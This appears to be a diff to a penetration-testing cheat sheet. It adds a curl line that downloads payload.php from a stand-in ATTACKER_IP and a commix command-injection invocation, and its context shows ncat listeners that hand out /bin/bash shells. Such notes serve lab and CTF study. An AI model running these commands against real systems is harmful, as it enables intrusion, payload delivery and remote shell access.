@@ -317,6 +317,8 @@ curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://<SERVER_IP>:<PORT>/
 
 curl 'http://<SERVER_IP>:<PORT>/search.php?search=le' -H 'Authorization: Basic YWRtaW46YWRtaW4='
 
+curl  http://ATTACKER_IP:PORT/payload.php --output payload.php
+
 # GPG - GPGToJohn #
 
 gpg --import priv.key
@@ -998,6 +1000,11 @@ ncat -lvnp 443 -c "ncat TARGET_SERVER 25"
 ncat -lvnp PORT_NUMBER -e /bin/bash
 
 ncat -lvnp Attacker_IP PORT_NUM -e /bin/bash
+
+# Commix #
+
+commix --url="http://10.10.10.10/OS.php" --cookie="cookie" --data="data"
+
 
 
 
